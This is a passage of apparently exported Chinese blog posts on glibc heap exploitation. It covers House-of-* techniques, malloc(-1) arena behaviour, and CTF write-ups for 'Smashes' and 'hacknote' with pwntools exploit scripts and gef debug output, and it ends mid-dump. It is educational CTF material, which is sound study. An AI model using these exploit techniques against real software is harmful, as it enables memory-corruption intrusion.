chunk 的 fd 指针。 House of Mind 构造一个设置了NON_MAIN_ARENA比特位的chunk进行free的攻击。查找chunk所属arena的计算是(p&amp;0xfff00000)-&gt;ar_ptr，在p&amp;0xfff00000构造伪造的heap_info和arena，将伪造的heap_info-&gt;ar_ptr指向伪造的arena，在伪造的arena-&gt;bin[0]中设置GOT-8之类的。NON_MAIN_ARENA的chunk在free时，free的chunk连接到那个GOT，造成GOt被修改。目前已被修改，unlink时加入了(对unsorted_chunks是fwd-&gt;bk != bck)验证，但是对fastbins仍然有效 House of Force 将top chunk(heap最后的chunk的下一个)的size修改为0xffffffff的一种攻击。之后，malloc(攻击者指定的大小)，可以获取到非常大的内存。对内存空间遍历一次，top chunk可以到达heap之前的bss，下一次malloc就可能获取到GOT。这种方式现在仍然有效 https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/ House of Spirit 如果存在类似chunk结构的内存，则可以通过free它在free_list追加它的地址。stack或者bss上进行free，下次malloc将返回GOT或者stack地址。这种攻击现在仍然有效。 House of Prime 确认一个chunk是否属于fastbins，是通过arena中的av-&gt;max_fast作为阈值来确定的。因此，如果将av-&gt;max_fast伪造为较大的值，则可以将任意内容注册为fastbins。对8比特size的chunk(原本最小size的chunk是16比特，伪造成8比特)进行free时，会注册到av-&gt;fastbinsY[-1]。这意味着在av-&gt;fastbinsY[]之前的变量av-&gt;max_fast被重写为较大的值。接下来，当free另一个chunk时，即便是size非常大的chunk，只要在av-&gt;m ax_fast以下，就会被作为fastbins处理，那么它将在超出av-&gt;fastbinsY[]限制的数组中注册。因此，可以覆盖av-&gt;fastbinsY[]之后的av-&gt;arena_key。这是多线程程序中有意义的arena指针。下一次进行malloc时，av-&gt;arena_key会被覆盖，引用它就能够获得arena。这相当于处理一个刚被free成arena的大的chunk。如果在这个chunk的fastbinsY[]或者bins[]，unsorted_chunks等设置GOt，那么在free后，malloc则会返回GOt。现在此方法已失效，因为已经不存在av-&gt;max_fast，已经更改为一个global_max_fast的全局变量。 how2heapShellphish战队的资料 https://github.com/shellphish/how2heap fastbin dup fastbin dup into stack unsafe unlink poison null byte overlapping chunks … 1. thread arenamalloc(-1) malloc或者new，参数作为unsigned long处理，所以附属会变得非常大 即使是单线程，也会发生切换到thread arena(mmap-ed arena) malloc和new基本是相同的，下面用malloc解释 分析malloc(-1) malloc()内部是怎么样的 这里用glibc(2.19)的源码 http://osxr.org:8080/glibc/source/malloc/malloc.c 从__libc_malloc()入手比较好 是一个strong_alias ar_ptr是指向管理整个heap的arena的指针 虽然程序启动时只有一个arena，但多线程可以生成多个arena malloc option的setup __malloc_hook有设置的话则会调用它。通常，第一次调用malloc()时，会包含malloc_hook_ini() 的地址。 这在内部被称为ptmalloc_init()，如果malloc的操作变更由环境变量指定，则相应的由__libc_mallopt()反映 之后，main_arena的地址作为[当前arena]保存在TLS区域中，并且再次调用__libc_malloc(bytes) TLS区域：Thread Local Storage。 C语言的static变量或者全局变量保存在data或者bss中。通常，多线程程序的内存空间在线程之间是通用的，因此，相同的值存储在所有线程中。但是，某些情况下想要在不同线程之间使用不同的静态或者全局变量，则可以用过TLS机制使得每个线程都是独立的全局变量。 此时，用作保存的区域是TLS区域，并且为每个线程分配了不同的存储区域（因为线程共享存储空间，因此TLS区域等于存储空间中的线程数）。访问时，将根据每个线程保存的key来确定使用哪个TLS区域。 获得当前crena 通过arena_lookup()获取TLS区域中当前arena的地址 如果是单线程，TLS只有一个，获得的就是之前设置的main_arena 如果是pthread_create()创建的多线程，每个线程都有一个单独的TLS，因为在创建线程后立即清零，所以获得的返回值是0 锁定当前arena 通过mutex_lock对main_aren进行锁定 通过 _int_malloc()，从main_aren申请内存 _int_malloc(ar_ptr, -1) 64位环境下， -1 == 0xffffffffffffffff，内存分配失败 因为堆中内存分配失败，此时victim = 0 进行重试，在内部生成新的arena 因为内存分配失败，尝试变更arena 调用arena_get2()，尝试选择不是main_arena的arena 首先，获取arena的最大个数 如果当前arena的数量小于最大数量，则会生成新的arena 如果当前数量已经到达最大数量，则从现有arena中选择 生成新的arena 更新TLS区域中当前arena的指针，以优先使用新生成的arena 返回新的arena 这就是thread arena（并不是正式叫法） 从arena_get_retry()返回后，使用thread arena尝试重新分配内存，失败 使用thread arena，再次调用_int_malloc()，结果也是失败 解锁，malloc()返回NULL unlock 返回NULL 动态调试一个简单的例子： 12345#include &lt;malloc.h&gt; int main(void)&#123; malloc(-1); return 0; &#125; 程序运行后main_arena内部大概是这样，next指向main_arena自身 第一次调用设置__malloc_hook的malloc_hook_ini()，即便停止也会跳过一次。malloc_hook_ini()结束后，TLS区域中设置了地址。 搜索包含main_arena地址的地址，在mapped中也发现有 指向main_arena的有两个，next和TLS区域 这个是TLS区域中指向当前arena的指针的地址(0x7ffff7fed700) 调用arena_get2()后，生成了新的arena 调用arena_get2()后，main_arena内部是这样，next的地址改变了 TLS区域中指向arena的地址也改变了 新的arena，bins的初始化也完成了 next指向main_arena 对比arena_get2()调用前后的内存映射状态，可以看出原本的arena(main_arena)是在bss区域，新生成的arena是通过mmap获取的内存 mapped内存区域前面，是_heap_info结构体 后面配置了thread arena 图示大概这样 后面是heap的chunk使用的区域 malloc(-1) X 2那么，thread arena生成后，再次调用malloc(-1)呢？ 通过arena_lookup()，从TLS区域获得arena的地址（更新后的thread arena地址） 通过mutex_lock锁定thread arena _int_malloc()失败 调用arena_get_retry() 第二次满足这个分支判断 不需要关注ar_ptr-&gt;next，只需要将arena切换到main_arena(不调用arena_get2()，不会生成thread arena) malloc(-1)总结 TLS的指针 当前arena由TLS区域的指针变量进行管理 arena 管理heap区域的arena，原本只有main_arena一个 通过malloc(-1)的失败，生成thread arena TLS区域的指针变量，也变成指向thread arena thread arena的数量 每个线程最多一个thread arena（加上main_arena共两个） 多数情况下，thread arena与线程一一对应 但是也存在线程间共用thread arena的情况 达到arena的最大值，会出现这种情况 补充以前的malloc()实现 在arena_get2()中，从上次lock成功的arena，通过跟随next使用lock成功的arena 全部失败才会创建新的arena 现代malloc()实现 — 通过pthreads创建多线程的情况 生成线程时，TLS区域也是新生成的 在新的TLS中，当前arena的指针被清空 因此，线程中第一次调用malloc时必定会调用arena_get2()，基本上会为每个线程创建一个thread arena 但是arena的数量存在最大值，如果超出，arena_get2()会使用已存在的arena作为当前arena（reused_arena()，通过arena的next来选择一个arena使用） 这种情况下，会存在同一个arena被多个线程使用 现代malloc()实现 — 其它方式(clone之类)创建多线程的情况 TLS不是专门新建的 当然，TLS区域也不会清零 因此，各个线程都使用相同的arena 参考资料https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/ new(-1) new(-1)也是类似的情况 获取sz参数 malloc(sz) 如果失败，抛出一个std::bad_alloc异常(如果有对应的异常处理程序，则调用它) https://gcc.gnu.org/viewcvs/gcc/trunk/libstdc%2B%2B-v3/libsupc%2B%2B/new_op.cc?view=markup https://cpplover.blogspot.jp/2010/07/operator-new.html","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Smashes","slug":"Smashes","date":"2019-07-11T06:49:44.000Z","updated":"2019-07-11T06:50:26.515Z","comments":true,"path":"2019/07/11/Smashes/","link":"","permalink":"https://darkwing.moe/2019/07/11/Smashes/","excerpt":"","text":"题目信息 Smashes, try your best to smash!!! nc pwn.jarvisoj.com 9877 https://dn.jarvisoj.com/challengefiles/smashes.44838f6edd4408a53feb2e2bbfe5b229 开了NX和Canary： 静态分析 题目就是简单地接受输入，要求overwrite，但因为有canary不能直接溢出，那么就可以考虑argv[0] leak，通过溢出覆盖argv[0]的地址，然后根据smashes信息获取覆盖地址的内容 另外文件中有很像flag的字串，但服务器上肯定不是这串，既然flag就在程序中，那么泄露的内容就确定了，但是程序执行的过程中会把flag给修改了，这里有个小知识，当ELF文件比较小的时候，他的不同区段可能会被多次映射，也就是说flag可能有备份，gdb查找一下 ： 在0x400d21有一处备份，那么我们就可以将argv[0]覆盖为0x400d21，来获取flag的值 exploit1234567891011121314151617from pwn import *elf = ELF('./smashes')sh = remote('pwn.jarvisoj.com', 9877)# sh = process('./smashes')context.arch = elf.arch# context.log_level = 'debug'flag_addr = 0x400D20sh.recvuntil(\"name?\")payload = p64(flag_addr) * 200sh.sendline(payload)sh.recvuntil('flag:')sh.sendline(\"1\")sh.interactive()","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"hacknote -- Use After Free","slug":"hacknote-Use-After-Free","date":"2019-07-10T07:10:07.000Z","updated":"2019-07-10T07:10:50.563Z","comments":true,"path":"2019/07/10/hacknote-Use-After-Free/","link":"","permalink":"https://darkwing.moe/2019/07/10/hacknote-Use-After-Free/","excerpt":"","text":"根据这个： https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/use_after_free-zh/ 原理简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况 内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。 内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。 内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。 而我们一般所指的 Use After Free 漏洞主要是后两种。此外，我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。 例子这里我们以 HITCON-training 中的 lab 10 hacknote 为例。 功能分析我们可以简单分析下程序，可以看出在程序的开头有个 menu 函数，其中有 1234puts(\" 1. Add note \");puts(\" 2. Delete note \");puts(\" 3. Print note \");puts(\" 4. Exit \"); 故而程序应该主要有 3 个功能。之后程序会根据用户的输入执行相应的功能。 add_note根据程序，我们可以看出程序最多可以添加 5 个 note。每个 note 有两个字段 put 与 content，其中 put 会被设置为一个函数，其函数会输出 content 具体的内容。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546unsigned int add_note()&#123; note *v0; // ebx signed int i; // [esp+Ch] [ebp-1Ch] int size; // [esp+10h] [ebp-18h] char buf; // [esp+14h] [ebp-14h] unsigned int v5; // [esp+1Ch] [ebp-Ch] v5 = __readgsdword(0x14u); if ( count &lt;= 5 ) &#123; for ( i = 0; i &lt;= 4; ++i ) &#123; if ( !notelist[i] ) &#123; notelist[i] = malloc(8u); if ( !notelist[i] ) &#123; puts(\"Alloca Error\"); exit(-1); &#125; notelist[i]-&gt;put = print_note_content; printf(\"Note size :\"); read(0, &amp;buf, 8u); size = atoi(&amp;buf); v0 = notelist[i]; v0-&gt;content = malloc(size); if ( !notelist[i]-&gt;content ) &#123; puts(\"Alloca Error\"); exit(-1); &#125; printf(\"Content :\"); read(0, notelist[i]-&gt;content, size); puts(\"Success !\"); ++count; return __readgsdword(0x14u) ^ v5; &#125; &#125; &#125; else &#123; puts(\"Full\"); &#125; return __readgsdword(0x14u) ^ v5;&#125; 函数源码： 1234567891011121314151617181920212223242526272829303132void add_note() &#123; int i; char buf[8]; int size; if (count &gt; 5) &#123; puts(\"Full\"); return; &#125; for (i = 0; i &lt; 5; i++) &#123; if (!notelist[i]) &#123; notelist[i] = (struct note *)malloc(sizeof(struct note)); if (!notelist[i]) &#123; puts(\"Alloca Error\"); exit(-1); &#125; notelist[i]-&gt;printnote = print_note_content; printf(\"Note size :\"); read(0, buf, 8); size = atoi(buf); notelist[i]-&gt;content = (char *)malloc(size); if (!notelist[i]-&gt;content) &#123; puts(\"Alloca Error\"); exit(-1); &#125; printf(\"Content :\"); read(0, notelist[i]-&gt;content, size); puts(\"Success !\"); count++; break; &#125; &#125;&#125; print_noteprint_note 就是简单的根据给定的 note 的索引来输出对应索引的 note 的内容。 12345678910111213141516171819unsigned int print_note()&#123; int v1; // [esp+4h] [ebp-14h] char buf; // [esp+8h] [ebp-10h] unsigned int v3; // [esp+Ch] [ebp-Ch] v3 = __readgsdword(0x14u); printf(\"Index :\"); read(0, &amp;buf, 4u); v1 = atoi(&amp;buf); if ( v1 &lt; 0 || v1 &gt;= count ) &#123; puts(\"Out of bound!\"); _exit(0); &#125; if ( notelist[v1] ) notelist[v1]-&gt;put(notelist[v1]); return __readgsdword(0x14u) ^ v3;&#125; 函数源码： 1234567891011121314void print_note() &#123; char buf[4]; int idx; printf(\"Index :\"); read(0, buf, 4); idx = atoi(buf); if (idx &lt; 0 || idx &gt;= count) &#123; puts(\"Out of bound!\"); _exit(0); &#125; if (notelist[idx]) &#123; notelist[idx]-&gt;printnote(notelist[idx]); &#125;&#125; del_notedel_note 会根据给定的索引来释放对应的 note。但是值得注意的是，在 删除的时候，只是单纯进行了 free，而没有设置为 NULL，那么显然，这里是存在 Use After Free 的情况的。 1234567891011121314151617181920212223unsigned int del_note()&#123; int v1; // [esp+4h] [ebp-14h] char buf; // [esp+8h] [ebp-10h] unsigned int v3; // [esp+Ch] [ebp-Ch] v3 = __readgsdword(0x14u); printf(\"Index :\"); read(0, &amp;buf, 4u); v1 = atoi(&amp;buf); if ( v1 &lt; 0 || v1 &gt;= count ) &#123; puts(\"Out of bound!\"); _exit(0); &#125; if ( notelist[v1] ) &#123; free(notelist[v1]-&gt;content); free(notelist[v1]); puts(\"Success\"); &#125; return __readgsdword(0x14u) ^ v3;&#125; 函数源码： 12345678910111213141516void del_note() &#123; char buf[4]; int idx; printf(\"Index :\"); read(0, buf, 4); idx = atoi(buf); if (idx &lt; 0 || idx &gt;= count) &#123; puts(\"Out of bound!\"); _exit(0); &#125; if (notelist[idx]) &#123; free(notelist[idx]-&gt;content); free(notelist[idx]); puts(\"Success\"); &#125;&#125; 利用分析我们可以看到 Use After Free 的情况确实可能会发生，那么怎么可以让它发生并且进行利用呢？需要同时注意的是，这个程序中还有一个 magic 函数，我们有没有可能来通过 use after free 来使得这个程序执行 magic 函数呢？一个很直接的想法是修改 note 的 put 字段为 magic 函数的地址，从而实现在执行 print note 的时候执行 magic 函数。 那么该怎么执行呢？ 我们可以简单来看一下每一个 note 生成的具体流程 程序申请 8 字节内存用来存放 note 中的 put 以及 content 指针。 程序根据输入的 size 来申请指定大小的内存，然后用来存储 content。 123456789+-----------------+ | put | +-----------------+ | content | size +-----------------+-------------------&gt;+----------------+ | real | | content | | | +----------------+ 那么，根据我们之前在堆的实现中所学到的，显然 note 是一个 fastbin chunk（大小为 16 字节）。我们的目的是希望一个 note 的 put 字段为 magic 的函数地址，那么我们必须想办法让某个 note 的 put 指针被覆盖为 magic 地址。由于程序中只有唯一的地方对 put 进行赋值。所以我们必须利用写 real content 的时候来进行覆盖。具体采用的思路如下 申请 note0，real content size 为 16（大小与 note 大小所在的 bin 不一样即可） 申请 note1，real content size 为 16（大小与 note 大小所在的 bin 不一样即可） 释放 note0 释放 note1 此时，大小为 16 的 fast bin chunk 中链表为 note1-&gt;note0 申请 note2，并且设置 real content 的大小为 8，那么根据堆的分配规则 note2 其实会分配 note1 对应的内存块。 real content 对应的 chunk 其实是 note0。 如果我们这时候向 note2 real content 的 chunk 部分写入 magic 的地址，那么由于我们没有 note0 为 NULL。当我们再次尝试输出 note0 的时候，程序就会调用 magic 函数。 利用脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *r = process('./hacknote')def addnote(size, content): r.recvuntil(\":\") r.sendline(\"1\") r.recvuntil(\":\") r.sendline(str(size)) r.recvuntil(\":\") r.sendline(content)def delnote(idx): r.recvuntil(\":\") r.sendline(\"2\") r.recvuntil(\":\") r.sendline(str(idx))def printnote(idx): r.recvuntil(\":\") r.sendline(\"3\") r.recvuntil(\":\") r.sendline(str(idx))gdb.attach(r)magic = 0x08048986addnote(32, \"aaaa\") # add note 0addnote(32, \"ddaa\") # add note 1delnote(0) # delete note 0delnote(1) # delete note 1addnote(8, p32(magic)) # add note 2printnote(0) # print note 0r.interactive() 脚本中使用gdb.attach(r)进行调试 我们可以具体看一下执行的流程，首先先下断点 magic地址，add_note中两处malloc地址，del_note中两处free地址： 123450x8048986 &lt;magic&gt;: 0x83e589550x080486ca &lt;+84&gt;: call 0x80484e0 &lt;malloc@plt&gt;0x0804875c &lt;+230&gt;: call 0x80484e0 &lt;malloc@plt&gt;0x08048893 &lt;+143&gt;: call 0x80484c0 &lt;free@plt&gt;0x080488a9 &lt;+165&gt;: call 0x80484c0 &lt;free@plt&gt; 两处 malloc 下断点 1234gef➤ b *0x0804875CBreakpoint 1 at 0x804875cgef➤ b *0x080486CABreakpoint 2 at 0x80486ca 两处 free 下断点 1234gef➤ b *0x08048893Breakpoint 3 at 0x8048893gef➤ b *0x080488A9Breakpoint 4 at 0x80488a9 （以下地址为我本地测试数据，和ctf-wiki有区别，请自行调试） 然后继续执行程序，可以看出申请 note0 时，所申请到的内存块地址为 0x09fc2160。（eax 存储函数返回值） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647$eax : 0x09fc2160 → 0x00000000$ebx : 0x0 $ecx : 0x21e99 $edx : 0x09fc2160 → 0x00000000$esp : 0xff8c2850 → 0x00000008$ebp : 0xff8c2888 → 0xff8c28a8 → 0x00000000$esi : 0xf7ecc000 → 0x001d7d6c (&quot;l&#125;&quot;?)$edi : 0x0 $eip : 0x080486cf → &lt;add_note+89&gt; add esp, 0x10$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 ───────────────────────────────────────────────────────────────────── stack ────0xff8c2850│+0x0000: 0x00000008 ← $esp0xff8c2854│+0x0004: 0x000000000xff8c2858│+0x0008: 0xf7d26375 → &lt;strtol+5&gt; add eax, 0x1a5c8b0xff8c285c│+0x000c: 0xf7d22b50 → &lt;atoi+16&gt; add esp, 0x1c0xff8c2860│+0x0010: 0xff8c2898 → 0xff8c0a31 → 0x000000000xff8c2864│+0x0014: 0x000000000xff8c2868│+0x0018: 0x0000000a0xff8c286c│+0x001c: 0x00000000─────────────────────────────────────────────────────────────── code:x86:32 ──── 0x80486c2 &lt;add_note+76&gt; add DWORD PTR [eax], eax 0x80486c4 &lt;add_note+78&gt; add BYTE PTR [ebx+0x86a0cec], al 0x80486ca &lt;add_note+84&gt; call 0x80484e0 &lt;malloc@plt&gt; → 0x80486cf &lt;add_note+89&gt; add esp, 0x10 0x80486d2 &lt;add_note+92&gt; mov edx, eax 0x80486d4 &lt;add_note+94&gt; mov eax, DWORD PTR [ebp-0x1c] 0x80486d7 &lt;add_note+97&gt; mov DWORD PTR [eax*4+0x804a070], edx 0x80486de &lt;add_note+104&gt; mov eax, DWORD PTR [ebp-0x1c] 0x80486e1 &lt;add_note+107&gt; mov eax, DWORD PTR [eax*4+0x804a070]─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: &quot;hacknote&quot;, stopped, reason: SINGLE STEP───────────────────────────────────────────────────────────────────── trace ────[#0] 0x80486cf → add_note()[#1] 0x8048ac5 → main()[#2] 0xf7d0ce81 → __libc_start_main(main&#x3D;0x8048a38 &lt;main&gt;, argc&#x3D;0x1, argv&#x3D;0xff8c2954, init&#x3D;0x8048b00 &lt;__libc_csu_init&gt;, fini&#x3D;0x8048b60 &lt;__libc_csu_fini&gt;, rtld_fini&#x3D;0xf7f009b0 &lt;_dl_fini&gt;, stack_end&#x3D;0xff8c294c)[#3] 0x8048581 → _start()────────────────────────────────────────────────────────────────────────────────0x080486cf in add_note ()gef➤ heap chunk 0x09fc2160Chunk(addr&#x3D;0x9fc2160, size&#x3D;0x10, flags&#x3D;PREV_INUSE)Chunk size: 16 (0x10)Usable size: 12 (0xc)Previous chunk size: 0 (0x0)PREV_INUSE flag: OnIS_MMAPPED flag: OffNON_MAIN_ARENA flag: Off 申请 note 0 的 content 的地址为 0x09fc2170 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647$eax : 0x09fc2170 → 0x00000000$ebx : 0x09fc2160 → 0x0804865b → &lt;print_note_content+0&gt; push ebp$ecx : 0x21e69 $edx : 0x09fc2170 → 0x00000000$esp : 0xff8c2850 → 0x00000020$ebp : 0xff8c2888 → 0xff8c28a8 → 0x00000000$esi : 0xf7ecc000 → 0x001d7d6c (&quot;l&#125;&quot;?)$edi : 0x0 $eip : 0x08048761 → &lt;add_note+235&gt; add esp, 0x10$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 ───────────────────────────────────────────────────────────────────── stack ────0xff8c2850│+0x0000: 0x00000020 ← $esp0xff8c2854│+0x0004: 0xff8c2874 → 0xf70a32330xff8c2858│+0x0008: 0x000000080xff8c285c│+0x000c: 0xf7d22b50 → &lt;atoi+16&gt; add esp, 0x1c0xff8c2860│+0x0010: 0xff8c2898 → 0xff8c0a31 → 0x000000000xff8c2864│+0x0014: 0x000000000xff8c2868│+0x0018: 0x0000000a0xff8c286c│+0x001c: 0x00000000─────────────────────────────────────────────────────────────── code:x86:32 ──── 0x8048752 &lt;add_note+220&gt; mov al, ds:0x458b0804 0x8048757 &lt;add_note+225&gt; call 0x581173df 0x804875c &lt;add_note+230&gt; call 0x80484e0 &lt;malloc@plt&gt; → 0x8048761 &lt;add_note+235&gt; add esp, 0x10 0x8048764 &lt;add_note+238&gt; mov DWORD PTR [ebx+0x4], eax 0x8048767 &lt;add_note+241&gt; mov eax, DWORD PTR [ebp-0x1c] 0x804876a &lt;add_note+244&gt; mov eax, DWORD PTR [eax*4+0x804a070] 0x8048771 &lt;add_note+251&gt; mov eax, DWORD PTR [eax+0x4] 0x8048774 &lt;add_note+254&gt; test eax, eax─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: &quot;hacknote&quot;, stopped, reason: SINGLE STEP───────────────────────────────────────────────────────────────────── trace ────[#0] 0x8048761 → add_note()[#1] 0x8048ac5 → main()[#2] 0xf7d0ce81 → __libc_start_main(main&#x3D;0x8048a38 &lt;main&gt;, argc&#x3D;0x1, argv&#x3D;0xff8c2954, init&#x3D;0x8048b00 &lt;__libc_csu_init&gt;, fini&#x3D;0x8048b60 &lt;__libc_csu_fini&gt;, rtld_fini&#x3D;0xf7f009b0 &lt;_dl_fini&gt;, stack_end&#x3D;0xff8c294c)[#3] 0x8048581 → _start()────────────────────────────────────────────────────────────────────────────────0x08048761 in add_note ()gef➤ heap chunk 0x09fc2170Chunk(addr&#x3D;0x9fc2170, size&#x3D;0x30, flags&#x3D;PREV_INUSE)Chunk size: 48 (0x30)Usable size: 44 (0x2c)Previous chunk size: 0 (0x0)PREV_INUSE flag: OnIS_MMAPPED flag: OffNON_MAIN_ARENA flag: Off 类似的，我们可以得到 note1 的地址以及其 content 的地址分别为 0x09fc21a0 和 0x09fc21b0。 同时，我们还可以看到 note0 与 note1 对应的 content 确实是相应的内存块。 12345678gef➤ grep aaaa[+] Searching &#39;aaaa&#39; in memory[+] In &#39;[heap]&#39;(0x9fc2000-0x9fe4000), permission&#x3D;rw- 0x9fc2170 - 0x9fc2174 → &quot;aaaa&quot; gef➤ grep ddaa[+] Searching &#39;ddaa&#39; in memory[+] In &#39;[heap]&#39;(0x9fc2000-0x9fe4000), permission&#x3D;rw- 0x9fc21b0 - 0x9fc21b4 → &quot;ddaa&quot; 下面就是 free 的过程了。我们可以依次发现首先，note0 的 content 被 free 123456789101112→ 0x8048893 &lt;del_note+143&gt; call 0x80484c0 &lt;free@plt&gt; ↳ 0x80484c0 &lt;free@plt+0&gt; jmp DWORD PTR ds:0x804a018 0x80484c6 &lt;free@plt+6&gt; push 0x18 0x80484cb &lt;free@plt+11&gt; jmp 0x8048480 0x80484d0 &lt;__stack_chk_fail@plt+0&gt; jmp DWORD PTR ds:0x804a01c 0x80484d6 &lt;__stack_chk_fail@plt+6&gt; push 0x20 0x80484db &lt;__stack_chk_fail@plt+11&gt; jmp 0x8048480─────────────────────────────────────────────────────── arguments (guessed) ────free@plt ( [sp + 0x0] &#x3D; 0x09fc2170 → &quot;aaaa&quot;, [sp + 0x4] &#x3D; 0xff8c2878 → 0xf7ec0a30 → 0x00200e46) 然后是 note0 本身 123456789101112 → 0x80488a9 &lt;del_note+165&gt; call 0x80484c0 &lt;free@plt&gt; ↳ 0x80484c0 &lt;free@plt+0&gt; jmp DWORD PTR ds:0x804a018 0x80484c6 &lt;free@plt+6&gt; push 0x18 0x80484cb &lt;free@plt+11&gt; jmp 0x8048480 0x80484d0 &lt;__stack_chk_fail@plt+0&gt; jmp DWORD PTR ds:0x804a01c 0x80484d6 &lt;__stack_chk_fail@plt+6&gt; push 0x20 0x80484db &lt;__stack_chk_fail@plt+11&gt; jmp 0x8048480─────────────────────────────────────────────────────── arguments (guessed) ────free@plt ( [sp + 0x0] &#x3D; 0x09fc2160 → 0x0804865b → &lt;print_note_content+0&gt; push ebp, [sp + 0x4] &#x3D; 0xff8c2878 → 0xf7ec0a30 → 0x00200e46) 当 delete 结束后，我们观看一下 bins，可以发现，确实其被存放在对应的 fast bin 中，(我这里因为测试环境版本问题，是Tcachebins，但可以看到两个地址是对的 123456789101112gef➤ heap bins ─────────────────────── Tcachebins for arena 0xf7ecc7a0 ───────────────────────Tcachebins[idx&#x3D;2, size&#x3D;0x18] count&#x3D;1 ← Chunk(addr&#x3D;0x9fc2160, size&#x3D;0x10, flags&#x3D;PREV_INUSE) Tcachebins[idx&#x3D;4, size&#x3D;0x28] count&#x3D;0 ← Chunk(addr&#x3D;0x9fc2170, size&#x3D;0x30, flags&#x3D;PREV_INUSE) ──────────────────────── Fastbins for arena 0xf7ecc7a0 ────────────────────────Fastbins[idx&#x3D;0, size&#x3D;0x8] 0x00Fastbins[idx&#x3D;1, size&#x3D;0x10] 0x00Fastbins[idx&#x3D;2, size&#x3D;0x18] 0x00Fastbins[idx&#x3D;3, size&#x3D;0x20] 0x00Fastbins[idx&#x3D;4, size&#x3D;0x28] 0x00Fastbins[idx&#x3D;5, size&#x3D;0x30] 0x00Fastbins[idx&#x3D;6, size&#x3D;0x38] 0x00 当我们将 note1 也全部删除完毕后，再次观看 bins。可以看出，后删除的 chunk 块确实处于表头。 123456789101112gef➤ heap bins─────────────────────── Tcachebins for arena 0xf7f217a0 ───────────────────────Tcachebins[idx&#x3D;2, size&#x3D;0x18] count&#x3D;2 ← Chunk(addr&#x3D;0x9cec1a0, size&#x3D;0x10, flags&#x3D;PREV_INUSE) ← Chunk(addr&#x3D;0x9cec160, size&#x3D;0x10, flags&#x3D;PREV_INUSE) Tcachebins[idx&#x3D;4, size&#x3D;0x28] count&#x3D;0 ← Chunk(addr&#x3D;0x9cec1b0, size&#x3D;0x30, flags&#x3D;PREV_INUSE) ← Chunk(addr&#x3D;0x9cec170, size&#x3D;0x30, flags&#x3D;PREV_INUSE) ──────────────────────── Fastbins for arena 0xf7f217a0 ────────────────────────Fastbins[idx&#x3D;0, size&#x3D;0x8] 0x00Fastbins[idx&#x3D;1, size&#x3D;0x10] 0x00Fastbins[idx&#x3D;2, size&#x3D;0x18] 0x00Fastbins[idx&#x3D;3, size&#x3D;0x20] 0x00Fastbins[idx&#x3D;4, size&#x3D;0x28] 0x00Fastbins[idx&#x3D;5, size&#x3D;0x30] 0x00Fastbins[idx&#x3D;6, size&#x3D;0x38] 0x00 那么，此时即将要申请 note2，我们可以看下 note2 都申请到了什么内存块，如下 申请 note2 对应的内存块为 0x09cec1a0，其实就是 note1 对应的内存地址。 12345678910111213141516171819202122232425$eax : 0x09cec1a0 → 0x09cec160 → 0x00000000$ebx : 0x0 $ecx : 0x09cec010 → 0x00020001$edx : 0x09cec1a0 → 0x09cec160 → 0x00000000$esp : 0xffca8fb0 → 0x00000008$ebp : 0xffca8fe8 → 0xffca9008 → 0x00000000$esi : 0xf7f21000 → 0x001d7d6c (&quot;l&#125;&quot;?)$edi : 0x0 $eip : 0x080486cf → &lt;add_note+89&gt; add esp, 0x10$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 ───────────────────────────────────────────────────────────────────── stack ────0xffca8fb0│+0x0000: 0x00000008 ← $esp0xffca8fb4│+0x0004: 0x000000040xffca8fb8│+0x0008: 0xf7d7b375 → &lt;strtol+5&gt; add eax, 0x1a5c8b0xffca8fbc│+0x000c: 0xf7d77b50 → &lt;atoi+16&gt; add esp, 0x1c0xffca8fc0│+0x0010: 0xffca8ff8 → 0xffca0a31 → 0x000000000xffca8fc4│+0x0014: 0x000000000xffca8fc8│+0x0018: 0x0000000a0xffca8fcc│+0x001c: 0x00000002─────────────────────────────────────────────────────────────── code:x86:32 ──── 0x80486c2 &lt;add_note+76&gt; add DWORD PTR [eax], eax 0x80486c4 &lt;add_note+78&gt; add BYTE PTR [ebx+0x86a0cec], al 0x80486ca &lt;add_note+84&gt; call 0x80484e0 &lt;malloc@plt&gt; → 0x80486cf &lt;add_note+89&gt; add esp, 0x10 申请 note2 的 content 的内存地址为 0x804b008，就是 note0 对应的地址，即此时我们向 note2 的 content 写内容，就会将 note0 的 put 字段覆盖。 12345678910111213141516171819202122232425$eax : 0x09cec160 → 0x00000000$ebx : 